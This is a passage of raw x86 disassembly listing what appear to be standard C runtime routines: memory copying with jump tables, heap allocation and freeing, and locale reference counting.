  424829:	leave  
  42482a:	ret    
  42482b:	nop
  42482c:	lea    esi,[ecx+esi*1-0x4]
  424830:	lea    edi,[ecx+edi*1-0x4]
  424834:	test   edi,0x3
  42483a:	jne    0x424860
  42483c:	shr    ecx,0x2
  42483f:	and    edx,0x3
  424842:	cmp    ecx,0x8
  424845:	jb     0x424854
  424847:	std    
  424848:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42484a:	cld    
  42484b:	jmp    DWORD PTR [edx*4+0x424978]
  424852:	mov    edi,edi
  424854:	neg    ecx
  424856:	jmp    DWORD PTR [ecx*4+0x424928]
  42485d:	lea    ecx,[ecx+0x0]
  424860:	mov    eax,edi
  424862:	mov    edx,0x3
  424867:	cmp    ecx,0x4
  42486a:	jb     0x424878
  42486c:	and    eax,0x3
  42486f:	sub    ecx,eax
  424871:	jmp    DWORD PTR [eax*4+0x42487c]
  424878:	jmp    DWORD PTR [ecx*4+0x424978]
  42487f:	nop
  424880:	mov    WORD PTR [eax+0x42],cs
  424883:	add    BYTE PTR [eax-0x27ffbdb8],dh
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424891:	mov    BYTE PTR [edi+0x3],al
  424894:	sub    esi,0x1
  424897:	shr    ecx,0x2
  42489a:	sub    edi,0x1
  42489d:	cmp    ecx,0x8
  4248a0:	jb     0x424854
  4248a2:	std    
  4248a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248a5:	cld    
  4248a6:	jmp    DWORD PTR [edx*4+0x424978]
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	and    edx,ecx
  4248b5:	mov    BYTE PTR [edi+0x3],al
  4248b8:	mov    al,BYTE PTR [esi+0x2]
  4248bb:	shr    ecx,0x2
  4248be:	mov    BYTE PTR [edi+0x2],al
  4248c1:	sub    esi,0x2
  4248c4:	sub    edi,0x2
  4248c7:	cmp    ecx,0x8
  4248ca:	jb     0x424854
  4248cc:	std    
  4248cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248cf:	cld    
  4248d0:	jmp    DWORD PTR [edx*4+0x424978]
  4248d7:	nop
  4248d8:	mov    al,BYTE PTR [esi+0x3]
  4248db:	and    edx,ecx
  4248dd:	mov    BYTE PTR [edi+0x3],al
  4248e0:	mov    al,BYTE PTR [esi+0x2]
  4248e3:	mov    BYTE PTR [edi+0x2],al
  4248e6:	mov    al,BYTE PTR [esi+0x1]
  4248e9:	shr    ecx,0x2
  4248ec:	mov    BYTE PTR [edi+0x1],al
  4248ef:	sub    esi,0x3
  4248f2:	sub    edi,0x3
  4248f5:	cmp    ecx,0x8
  4248f8:	jb     0x424854
  4248fe:	std    
  4248ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424901:	cld    
  424902:	jmp    DWORD PTR [edx*4+0x424978]
  424909:	lea    ecx,[ecx+0x0]
  42490c:	sub    al,0x49
  42490e:	inc    edx
  42490f:	add    BYTE PTR [ecx+ecx*2],dh
  424912:	inc    edx
  424913:	add    BYTE PTR [ecx+ecx*2],bh
  424916:	inc    edx
  424917:	add    BYTE PTR [ecx+ecx*2+0x42],al
  42491b:	add    BYTE PTR [ecx+ecx*2+0x42],cl
  42491f:	add    BYTE PTR [ecx+ecx*2+0x42],dl
  424923:	add    BYTE PTR [ecx+ecx*2+0x42],bl
  424927:	add    BYTE PTR [edi+0x49],ch
  42492a:	inc    edx
  42492b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424931:	inc    esp
  424932:	(bad)  
  424933:	sbb    al,0x8b
  424935:	inc    esp
  424936:	mov    ds,WORD PTR [eax]
  424938:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424940:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424944:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424948:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42494c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424950:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424954:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424958:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42495c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424960:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424964:	lea    eax,[ecx*4+0x0]
  42496b:	add    esi,eax
  42496d:	add    edi,eax
  42496f:	jmp    DWORD PTR [edx*4+0x424978]
  424976:	mov    edi,edi
  424978:	mov    BYTE PTR [ecx+0x42],cl
  42497b:	add    BYTE PTR [eax-0x5fffbdb7],dl
  424981:	dec    ecx
  424982:	inc    edx
  424983:	add    BYTE PTR [ecx+ecx*2+0x458b0042],dh
  42498a:	or     BYTE PTR [esi+0x5f],bl
  42498d:	leave  
  42498e:	ret    
  42498f:	nop
  424990:	mov    al,BYTE PTR [esi+0x3]
  424993:	mov    BYTE PTR [edi+0x3],al
  424996:	mov    eax,DWORD PTR [ebp+0x8]
  424999:	pop    esi
  42499a:	pop    edi
  42499b:	leave  
  42499c:	ret    
  42499d:	lea    ecx,[ecx+0x0]
  4249a0:	mov    al,BYTE PTR [esi+0x3]
  4249a3:	mov    BYTE PTR [edi+0x3],al
  4249a6:	mov    al,BYTE PTR [esi+0x2]
  4249a9:	mov    BYTE PTR [edi+0x2],al
  4249ac:	mov    eax,DWORD PTR [ebp+0x8]
  4249af:	pop    esi
  4249b0:	pop    edi
  4249b1:	leave  
  4249b2:	ret    
  4249b3:	nop
  4249b4:	mov    al,BYTE PTR [esi+0x3]
  4249b7:	mov    BYTE PTR [edi+0x3],al
  4249ba:	mov    al,BYTE PTR [esi+0x2]
  4249bd:	mov    BYTE PTR [edi+0x2],al
  4249c0:	mov    al,BYTE PTR [esi+0x1]
  4249c3:	mov    BYTE PTR [edi+0x1],al
  4249c6:	mov    eax,DWORD PTR [ebp+0x8]
  4249c9:	pop    esi
  4249ca:	pop    edi
  4249cb:	leave  
  4249cc:	ret    
  4249cd:	push   DWORD PTR [esp+0x4]
  4249d1:	call   DWORD PTR ds:0x4280e0
  4249d7:	xor    eax,eax
  4249d9:	inc    eax
  4249da:	ret    0x8
  4249dd:	push   0x10
  4249df:	push   0x428608
  4249e4:	call   0x423950
  4249e9:	mov    eax,ds:0x465fc8
  4249ee:	test   eax,eax
  4249f0:	jne    0x424a29
  4249f2:	cmp    DWORD PTR ds:0x465d04,0x1
  4249f9:	je     0x424a1f
  4249fb:	push   0x4285f4
  424a00:	call   DWORD PTR ds:0x428044
  424a06:	test   eax,eax
  424a08:	je     0x424a1f
  424a0a:	push   0x4285cc
  424a0f:	push   eax
  424a10:	call   DWORD PTR ds:0x428040
  424a16:	mov    ds:0x465fc8,eax
  424a1b:	test   eax,eax
  424a1d:	jne    0x424a29
  424a1f:	mov    eax,0x4249cd
  424a24:	mov    ds:0x465fc8,eax
  424a29:	and    DWORD PTR [ebp-0x4],0x0
  424a2d:	push   DWORD PTR [ebp+0xc]
  424a30:	push   DWORD PTR [ebp+0x8]
  424a33:	call   eax
  424a35:	mov    DWORD PTR [ebp-0x1c],eax
  424a38:	jmp    0x424a5e
  424a3a:	mov    eax,DWORD PTR [ebp-0x14]
  424a3d:	mov    eax,DWORD PTR [eax]
  424a3f:	mov    eax,DWORD PTR [eax]
  424a41:	mov    DWORD PTR [ebp-0x20],eax
  424a44:	xor    eax,eax
  424a46:	inc    eax
  424a47:	ret    
  424a48:	mov    esp,DWORD PTR [ebp-0x18]
  424a4b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a52:	jne    0x424a5c
  424a54:	push   0x8
  424a56:	call   DWORD PTR ds:0x4280a8
  424a5c:	xor    eax,eax
  424a5e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a62:	call   0x42398b
  424a67:	ret    
  424a68:	push   0x10
  424a6a:	push   0x428618
  424a6f:	call   0x423950
  424a74:	mov    esi,DWORD PTR [ebp+0x8]
  424a77:	imul   esi,DWORD PTR [ebp+0xc]
  424a7b:	mov    DWORD PTR [ebp-0x1c],esi
  424a7e:	test   esi,esi
  424a80:	jne    0x424a83
  424a82:	inc    esi
  424a83:	xor    edi,edi
  424a85:	mov    DWORD PTR [ebp-0x20],edi
  424a88:	cmp    esi,0xffffffe0
  424a8b:	ja     0x424af2
  424a8d:	cmp    DWORD PTR ds:0x466384,0x3
  424a94:	jne    0x424add
  424a96:	add    esi,0xf
  424a99:	and    esi,0xfffffff0
  424a9c:	mov    DWORD PTR [ebp+0xc],esi
  424a9f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424aa2:	cmp    ebx,DWORD PTR ds:0x466144
  424aa8:	ja     0x424add
  424aaa:	push   0x4
  424aac:	call   0x423b0f
  424ab1:	pop    ecx
  424ab2:	and    DWORD PTR [ebp-0x4],edi
  424ab5:	push   ebx
  424ab6:	call   0x425511
  424abb:	pop    ecx
  424abc:	mov    DWORD PTR [ebp-0x20],eax
  424abf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424ac3:	call   0x424b12
  424ac8:	mov    edi,DWORD PTR [ebp-0x20]
  424acb:	test   edi,edi
  424acd:	je     0x424ae1
  424acf:	push   DWORD PTR [ebp-0x1c]
  424ad2:	push   0x0
  424ad4:	push   edi
  424ad5:	call   0x426250
  424ada:	add    esp,0xc
  424add:	test   edi,edi
  424adf:	jne    0x424b1b
  424ae1:	push   esi
  424ae2:	push   0x8
  424ae4:	push   DWORD PTR ds:0x466380
  424aea:	call   DWORD PTR ds:0x428030
  424af0:	mov    edi,eax
  424af2:	test   edi,edi
  424af4:	jne    0x424b1b
  424af6:	cmp    DWORD PTR ds:0x466008,edi
  424afc:	je     0x424b1b
  424afe:	push   esi
  424aff:	call   0x426232
  424b04:	pop    ecx
  424b05:	test   eax,eax
  424b07:	jne    0x424a83
  424b0d:	jmp    0x424b1d
  424b0f:	mov    esi,DWORD PTR [ebp+0xc]
  424b12:	push   0x4
  424b14:	call   0x423a7b
  424b19:	pop    ecx
  424b1a:	ret    
  424b1b:	mov    eax,edi
  424b1d:	call   0x42398b
  424b22:	ret    
  424b23:	push   esi
  424b24:	mov    esi,DWORD PTR [esp+0x8]
  424b28:	mov    eax,DWORD PTR [esi+0x3c]
  424b2b:	push   edi
  424b2c:	xor    edi,edi
  424b2e:	cmp    eax,DWORD PTR ds:0x466014
  424b34:	je     0x424b99
  424b36:	cmp    eax,edi
  424b38:	je     0x424b99
  424b3a:	mov    eax,DWORD PTR [esi+0x2c]
  424b3d:	cmp    DWORD PTR [eax],edi
  424b3f:	jne    0x424b99
  424b41:	mov    eax,DWORD PTR [esi+0x34]
  424b44:	cmp    eax,edi
  424b46:	je     0x424b64
  424b48:	cmp    DWORD PTR [eax],edi
  424b4a:	jne    0x424b64
  424b4c:	cmp    eax,DWORD PTR ds:0x466130
  424b52:	je     0x424b64
  424b54:	push   eax
  424b55:	call   0x42455a
  424b5a:	push   DWORD PTR [esi+0x3c]
  424b5d:	call   0x42649f
  424b62:	pop    ecx
  424b63:	pop    ecx
  424b64:	mov    eax,DWORD PTR [esi+0x30]
  424b67:	cmp    eax,edi
  424b69:	je     0x424b87
  424b6b:	cmp    DWORD PTR [eax],edi
  424b6d:	jne    0x424b87
  424b6f:	cmp    eax,DWORD PTR ds:0x466134
  424b75:	je     0x424b87
  424b77:	push   eax
  424b78:	call   0x42455a
  424b7d:	push   DWORD PTR [esi+0x3c]
  424b80:	call   0x426440
  424b85:	pop    ecx
  424b86:	pop    ecx
  424b87:	push   DWORD PTR [esi+0x2c]
  424b8a:	call   0x42455a
  424b8f:	push   DWORD PTR [esi+0x3c]
  424b92:	call   0x42455a
  424b97:	pop    ecx
  424b98:	pop    ecx
  424b99:	mov    eax,DWORD PTR [esi+0x40]
  424b9c:	cmp    eax,DWORD PTR ds:0x46612c
  424ba2:	je     0x424bbc
  424ba4:	cmp    eax,edi
  424ba6:	je     0x424bbc
  424ba8:	cmp    DWORD PTR [eax],edi
  424baa:	jne    0x424bbc
  424bac:	push   eax
  424bad:	call   0x42455a
  424bb2:	push   DWORD PTR [esi+0x44]
  424bb5:	call   0x42455a
  424bba:	pop    ecx
  424bbb:	pop    ecx
  424bbc:	mov    eax,DWORD PTR [esi+0x50]
  424bbf:	cmp    eax,DWORD PTR ds:0x466010
  424bc5:	je     0x424be3
  424bc7:	cmp    eax,edi
  424bc9:	je     0x424be3
  424bcb:	cmp    DWORD PTR [eax+0xb4],edi
  424bd1:	jne    0x424be3
  424bd3:	push   eax
  424bd4:	call   0x4262b0
  424bd9:	push   DWORD PTR [esi+0x50]
  424bdc:	call   0x42455a
  424be1:	pop    ecx
  424be2:	pop    ecx
  424be3:	push   esi
  424be4:	call   0x42455a
  424be9:	pop    ecx
  424bea:	pop    edi
  424beb:	pop    esi
  424bec:	ret    
  424bed:	push   esi
  424bee:	call   0x423803
  424bf3:	mov    esi,eax
  424bf5:	mov    eax,DWORD PTR [esi+0x64]
  424bf8:	cmp    eax,DWORD PTR ds:0x4657bc
  424bfe:	je     0x424caa
  424c04:	test   eax,eax
  424c06:	je     0x424c37
  424c08:	mov    ecx,DWORD PTR [eax+0x2c]
  424c0b:	dec    DWORD PTR [eax]
  424c0d:	test   ecx,ecx
  424c0f:	je     0x424c13
  424c11:	dec    DWORD PTR [ecx]
  424c13:	mov    ecx,DWORD PTR [eax+0x34]
  424c16:	test   ecx,ecx
  424c18:	je     0x424c1c
  424c1a:	dec    DWORD PTR [ecx]
  424c1c:	mov    ecx,DWORD PTR [eax+0x30]
  424c1f:	test   ecx,ecx
  424c21:	je     0x424c25
  424c23:	dec    DWORD PTR [ecx]
  424c25:	mov    ecx,DWORD PTR [eax+0x40]
  424c28:	test   ecx,ecx
  424c2a:	je     0x424c2e
  424c2c:	dec    DWORD PTR [ecx]
  424c2e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c31:	dec    DWORD PTR [ecx+0xb4]
  424c37:	mov    ecx,DWORD PTR ds:0x4657bc
  424c3d:	mov    DWORD PTR [esi+0x64],ecx
  424c40:	mov    ecx,DWORD PTR ds:0x4657bc
  424c46:	inc    DWORD PTR [ecx]
  424c48:	mov    ecx,DWORD PTR ds:0x4657bc
  424c4e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c51:	test   ecx,ecx
  424c53:	je     0x424c57
  424c55:	inc    DWORD PTR [ecx]
  424c57:	mov    ecx,DWORD PTR ds:0x4657bc
  424c5d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c60:	test   ecx,ecx
  424c62:	je     0x424c66
  424c64:	inc    DWORD PTR [ecx]
  424c66:	mov    ecx,DWORD PTR ds:0x4657bc
  424c6c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c6f:	test   ecx,ecx
  424c71:	je     0x424c75
  424c73:	inc    DWORD PTR [ecx]
  424c75:	mov    ecx,DWORD PTR ds:0x4657bc
  424c7b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c7e:	test   ecx,ecx
  424c80:	je     0x424c84
  424c82:	inc    DWORD PTR [ecx]
  424c84:	mov    ecx,DWORD PTR ds:0x4657bc
  424c8a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c8d:	inc    DWORD PTR [ecx+0xb4]
  424c93:	test   eax,eax
  424c95:	je     0x424caa
  424c97:	cmp    DWORD PTR [eax],0x0
  424c9a:	jne    0x424caa
  424c9c:	cmp    eax,0x465768
  424ca1:	je     0x424caa
  424ca3:	push   eax
  424ca4:	call   0x424b23
  424ca9:	pop    ecx
  424caa:	mov    eax,DWORD PTR [esi+0x64]
  424cad:	pop    esi
  424cae:	ret    
  424caf:	push   0xc
  424cb1:	push   0x4287a8
  424cb6:	call   0x423950
  424cbb:	push   0xc
  424cbd:	call   0x423b0f
  424cc2:	pop    ecx
  424cc3:	and    DWORD PTR [ebp-0x4],0x0
  424cc7:	call   0x424bed
  424ccc:	mov    DWORD PTR [ebp-0x1c],eax
  424ccf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cd3:	call   0x424ce1
  424cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  424cdb:	call   0x42398b
  424ce0:	ret    
  424ce1:	push   0xc
  424ce3:	call   0x423a7b
  424ce8:	pop    ecx
  424ce9:	ret    
  424cea:	push   0x140
  424cef:	push   0x0
  424cf1:	push   DWORD PTR ds:0x466380
  424cf7:	call   DWORD PTR ds:0x428030
  424cfd:	test   eax,eax
  424cff:	mov    ds:0x466140,eax
  424d04:	jne    0x424d07
  424d06:	ret    
  424d07:	mov    ecx,DWORD PTR [esp+0x4]
  424d0b:	and    DWORD PTR ds:0x466138,0x0
  424d12:	and    DWORD PTR ds:0x46613c,0x0
  424d19:	mov    ds:0x466148,eax
  424d1e:	xor    eax,eax
  424d20:	mov    DWORD PTR ds:0x466144,ecx
  424d26:	mov    DWORD PTR ds:0x46614c,0x10
  424d30:	inc    eax
  424d31:	ret    
  424d32:	mov    eax,ds:0x46613c
  424d37:	lea    ecx,[eax+eax*4]
  424d3a:	mov    eax,ds:0x466140
  424d3f:	lea    ecx,[eax+ecx*4]
  424d42:	jmp    0x424d56
  424d44:	mov    edx,DWORD PTR [esp+0x4]
  424d48:	sub    edx,DWORD PTR [eax+0xc]
  424d4b:	cmp    edx,0x100000
  424d51:	jb     0x424d5c
  424d53:	add    eax,0x14
  424d56:	cmp    eax,ecx
  424d58:	jb     0x424d44
  424d5a:	xor    eax,eax
  424d5c:	ret    
  424d5d:	push   ebp
  424d5e:	mov    ebp,esp
  424d60:	sub    esp,0x10
  424d63:	mov    ecx,DWORD PTR [ebp+0x8]
  424d66:	mov    eax,DWORD PTR [ecx+0x10]
  424d69:	push   esi
  424d6a:	mov    esi,DWORD PTR [ebp+0xc]
  424d6d:	push   edi
  424d6e:	mov    edi,esi
  424d70:	sub    edi,DWORD PTR [ecx+0xc]
  424d73:	add    esi,0xfffffffc
  424d76:	shr    edi,0xf
  424d79:	mov    ecx,edi
  424d7b:	imul   ecx,ecx,0x204
  424d81:	lea    ecx,[ecx+eax*1+0x144]
  424d88:	mov    DWORD PTR [ebp-0x10],ecx
  424d8b:	mov    ecx,DWORD PTR [esi]
  424d8d:	dec    ecx
  424d8e:	test   cl,0x1
  424d91:	mov    DWORD PTR [ebp-0x4],ecx
  424d94:	jne    0x425071
  424d9a:	push   ebx
  424d9b:	lea    ebx,[ecx+esi*1]
  424d9e:	mov    edx,DWORD PTR [ebx]
  424da0:	mov    DWORD PTR [ebp-0xc],edx
  424da3:	mov    edx,DWORD PTR [esi-0x4]
  424da6:	mov    DWORD PTR [ebp-0x8],edx
  424da9:	mov    edx,DWORD PTR [ebp-0xc]
  424dac:	test   dl,0x1
  424daf:	mov    DWORD PTR [ebp+0xc],ebx
  424db2:	jne    0x424e28
  424db4:	sar    edx,0x4
  424db7:	dec    edx
  424db8:	cmp    edx,0x3f
  424dbb:	jbe    0x424dc0
  424dbd:	push   0x3f
  424dbf:	pop    edx
  424dc0:	mov    ecx,DWORD PTR [ebx+0x4]
  424dc3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424dc6:	jne    0x424e0a
  424dc8:	cmp    edx,0x20
  424dcb:	mov    ebx,0x80000000
  424dd0:	jae    0x424deb
  424dd2:	mov    ecx,edx
  424dd4:	shr    ebx,cl
  424dd6:	lea    ecx,[edx+eax*1+0x4]
  424dda:	not    ebx
  424ddc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424de0:	dec    BYTE PTR [ecx]
  424de2:	jne    0x424e07
  424de4:	mov    ecx,DWORD PTR [ebp+0x8]
  424de7:	and    DWORD PTR [ecx],ebx
  424de9:	jmp    0x424e07
  424deb:	lea    ecx,[edx-0x20]
  424dee:	shr    ebx,cl
  424df0:	lea    ecx,[edx+eax*1+0x4]
  424df4:	not    ebx
  424df6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424dfd:	dec    BYTE PTR [ecx]
  424dff:	jne    0x424e07
  424e01:	mov    ecx,DWORD PTR [ebp+0x8]
  424e04:	and    DWORD PTR [ecx+0x4],ebx
  424e07:	mov    ebx,DWORD PTR [ebp+0xc]
  424e0a:	mov    edx,DWORD PTR [ebx+0x8]
  424e0d:	mov    ebx,DWORD PTR [ebx+0x4]
  424e10:	mov    ecx,DWORD PTR [ebp-0x4]
  424e13:	add    ecx,DWORD PTR [ebp-0xc]
  424e16:	mov    DWORD PTR [edx+0x4],ebx
  424e19:	mov    edx,DWORD PTR [ebp+0xc]
  424e1c:	mov    ebx,DWORD PTR [edx+0x4]
  424e1f:	mov    edx,DWORD PTR [edx+0x8]
  424e22:	mov    DWORD PTR [ebx+0x8],edx
  424e25:	mov    DWORD PTR [ebp-0x4],ecx
  424e28:	mov    edx,ecx
  424e2a:	sar    edx,0x4
  424e2d:	dec    edx
  424e2e:	cmp    edx,0x3f
  424e31:	jbe    0x424e36
  424e33:	push   0x3f
  424e35:	pop    edx
  424e36:	mov    ebx,DWORD PTR [ebp-0x8]
  424e39:	and    ebx,0x1
  424e3c:	mov    DWORD PTR [ebp-0xc],ebx
  424e3f:	jne    0x424ed4
  424e45:	sub    esi,DWORD PTR [ebp-0x8]
  424e48:	mov    ebx,DWORD PTR [ebp-0x8]
  424e4b:	sar    ebx,0x4
  424e4e:	push   0x3f
  424e50:	mov    DWORD PTR [ebp+0xc],esi
  424e53:	dec    ebx
  424e54:	pop    esi
  424e55:	cmp    ebx,esi
  424e57:	jbe    0x424e5b
  424e59:	mov    ebx,esi
  424e5b:	add    ecx,DWORD PTR [ebp-0x8]
  424e5e:	mov    edx,ecx
  424e60:	sar    edx,0x4
  424e63:	dec    edx
  424e64:	cmp    edx,esi
  424e66:	mov    DWORD PTR [ebp-0x4],ecx
  424e69:	jbe    0x424e6d
  424e6b:	mov    edx,esi
  424e6d:	cmp    ebx,edx
  424e6f:	je     0x424ecf
  424e71:	mov    ecx,DWORD PTR [ebp+0xc]
  424e74:	mov    esi,DWORD PTR [ecx+0x4]
  424e77:	cmp    esi,DWORD PTR [ecx+0x8]
  424e7a:	jne    0x424eb7
  424e7c:	cmp    ebx,0x20
  424e7f:	mov    esi,0x80000000
  424e84:	jae    0x424e9d
  424e86:	mov    ecx,ebx
  424e88:	shr    esi,cl
  424e8a:	not    esi
  424e8c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e90:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e94:	jne    0x424eb7
  424e96:	mov    ecx,DWORD PTR [ebp+0x8]
  424e99:	and    DWORD PTR [ecx],esi
  424e9b:	jmp    0x424eb7
  424e9d:	lea    ecx,[ebx-0x20]
  424ea0:	shr    esi,cl
  424ea2:	not    esi
  424ea4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424eab:	dec    BYTE PTR [ebx+eax*1+0x4]
  424eaf:	jne    0x424eb7
  424eb1:	mov    ecx,DWORD PTR [ebp+0x8]
  424eb4:	and    DWORD PTR [ecx+0x4],esi
  424eb7:	mov    ecx,DWORD PTR [ebp+0xc]
  424eba:	mov    esi,DWORD PTR [ecx+0x8]
  424ebd:	mov    ecx,DWORD PTR [ecx+0x4]
  424ec0:	mov    DWORD PTR [esi+0x4],ecx
  424ec3:	mov    ecx,DWORD PTR [ebp+0xc]
  424ec6:	mov    esi,DWORD PTR [ecx+0x4]
  424ec9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ecc:	mov    DWORD PTR [esi+0x8],ecx
  424ecf:	mov    esi,DWORD PTR [ebp+0xc]
  424ed2:	jmp    0x424ed7
  424ed4:	mov    ebx,DWORD PTR [ebp+0x8]
  424ed7:	cmp    DWORD PTR [ebp-0xc],0x0
  424edb:	jne    0x424ee5
  424edd:	cmp    ebx,edx
  424edf:	je     0x424f65
  424ee5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ee8:	lea    ecx,[ecx+edx*8]
  424eeb:	mov    ebx,DWORD PTR [ecx+0x4]
  424eee:	mov    DWORD PTR [esi+0x8],ecx
  424ef1:	mov    DWORD PTR [esi+0x4],ebx
  424ef4:	mov    DWORD PTR [ecx+0x4],esi
  424ef7:	mov    ecx,DWORD PTR [esi+0x4]
  424efa:	mov    DWORD PTR [ecx+0x8],esi
  424efd:	mov    ecx,DWORD PTR [esi+0x4]
  424f00:	cmp    ecx,DWORD PTR [esi+0x8]
  424f03:	jne    0x424f65
  424f05:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424f09:	mov    BYTE PTR [ebp+0xf],cl
  424f0c:	inc    cl
  424f0e:	cmp    edx,0x20
  424f11:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424f15:	jae    0x424f3c
  424f17:	cmp    BYTE PTR [ebp+0xf],0x0
  424f1b:	jne    0x424f2b
  424f1d:	mov    ecx,edx
  424f1f:	mov    ebx,0x80000000
  424f24:	shr    ebx,cl
  424f26:	mov    ecx,DWORD PTR [ebp+0x8]
  424f29:	or     DWORD PTR [ecx],ebx
  424f2b:	mov    ebx,0x80000000
  424f30:	mov    ecx,edx
  424f32:	shr    ebx,cl
  424f34:	lea    eax,[eax+edi*4+0x44]
  424f38:	or     DWORD PTR [eax],ebx
  424f3a:	jmp    0x424f65
  424f3c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f40:	jne    0x424f52
  424f42:	lea    ecx,[edx-0x20]
  424f45:	mov    ebx,0x80000000
  424f4a:	shr    ebx,cl
  424f4c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f4f:	or     DWORD PTR [ecx+0x4],ebx
  424f52:	lea    ecx,[edx-0x20]
  424f55:	mov    edx,0x80000000
  424f5a:	shr    edx,cl
  424f5c:	lea    eax,[eax+edi*4+0xc4]
  424f63:	or     DWORD PTR [eax],edx
  424f65:	mov    eax,DWORD PTR [ebp-0x4]
  424f68:	mov    DWORD PTR [esi],eax
  424f6a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f6e:	mov    eax,DWORD PTR [ebp-0x10]
  424f71:	dec    DWORD PTR [eax]
  424f73:	jne    0x425070
  424f79:	mov    eax,ds:0x466138
  424f7e:	test   eax,eax
  424f80:	je     0x425062
  424f86:	mov    ecx,DWORD PTR ds:0x466150
  424f8c:	mov    esi,DWORD PTR ds:0x4280c0
  424f92:	push   0x4000
  424f97:	shl    ecx,0xf
  424f9a:	add    ecx,DWORD PTR [eax+0xc]
  424f9d:	mov    ebx,0x8000
  424fa2:	push   ebx
  424fa3:	push   ecx
  424fa4:	call   esi
  424fa6:	mov    ecx,DWORD PTR ds:0x466150
  424fac:	mov    eax,ds:0x466138
  424fb1:	mov    edx,0x80000000
  424fb6:	shr    edx,cl
  424fb8:	or     DWORD PTR [eax+0x8],edx
  424fbb:	mov    eax,ds:0x466138
  424fc0:	mov    eax,DWORD PTR [eax+0x10]
  424fc3:	mov    ecx,DWORD PTR ds:0x466150
  424fc9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fd1:	mov    eax,ds:0x466138
  424fd6:	mov    eax,DWORD PTR [eax+0x10]
  424fd9:	dec    BYTE PTR [eax+0x43]
  424fdc:	mov    eax,ds:0x466138
  424fe1:	mov    ecx,DWORD PTR [eax+0x10]
  424fe4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fe8:	jne    0x424ff3
  424fea:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fee:	mov    eax,ds:0x466138
  424ff3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424ff7:	jne    0x425062
  424ff9:	push   ebx
  424ffa:	push   0x0
  424ffc:	push   DWORD PTR [eax+0xc]
  424fff:	call   esi
  425001:	mov    eax,ds:0x466138
  425006:	push   DWORD PTR [eax+0x10]
  425009:	push   0x0
  42500b:	push   DWORD PTR ds:0x466380
  425011:	call   DWORD PTR ds:0x4280c4
  425017:	mov    eax,ds:0x46613c
  42501c:	mov    edx,DWORD PTR ds:0x466140
  425022:	lea    eax,[eax+eax*4]
  425025:	shl    eax,0x2
  425028:	mov    ecx,eax
  42502a:	mov    eax,ds:0x466138
  42502f:	sub    ecx,eax
  425031:	lea    ecx,[ecx+edx*1-0x14]
  425035:	push   ecx
  425036:	lea    ecx,[eax+0x14]
  425039:	push   ecx
  42503a:	push   eax
  42503b:	call   0x426890
  425040:	mov    eax,DWORD PTR [ebp+0x8]
  425043:	add    esp,0xc
  425046:	dec    DWORD PTR ds:0x46613c
  42504c:	cmp    eax,DWORD PTR ds:0x466138
  425052:	jbe    0x425058
  425054:	sub    DWORD PTR [ebp+0x8],0x14
  425058:	mov    eax,ds:0x466140
  42505d:	mov    ds:0x466148,eax
  425062:	mov    eax,DWORD PTR [ebp+0x8]
  425065:	mov    ds:0x466138,eax
  42506a:	mov    DWORD PTR ds:0x466150,edi
  425070:	pop    ebx
  425071:	pop    edi
  425072:	pop    esi
  425073:	leave  
  425074:	ret    
  425075:	mov    eax,ds:0x46613c
  42507a:	mov    ecx,DWORD PTR ds:0x46614c
  425080:	push   edi
  425081:	xor    edi,edi
  425083:	cmp    eax,ecx
  425085:	jne    0x4250bb
  425087:	lea    eax,[ecx+ecx*4+0x50]
  42508b:	shl    eax,0x2
  42508e:	push   eax
  42508f:	push   DWORD PTR ds:0x466140
  425095:	push   edi
  425096:	push   DWORD PTR ds:0x466380
  42509c:	call   DWORD PTR ds:0x4280e8
  4250a2:	cmp    eax,edi
  4250a4:	jne    0x4250aa
  4250a6:	xor    eax,eax
  4250a8:	pop    edi
  4250a9:	ret    
  4250aa:	add    DWORD PTR ds:0x46614c,0x10
  4250b1:	mov    ds:0x466140,eax
  4250b6:	mov    eax,ds:0x46613c
  4250bb:	mov    ecx,DWORD PTR ds:0x466140
  4250c1:	push   esi
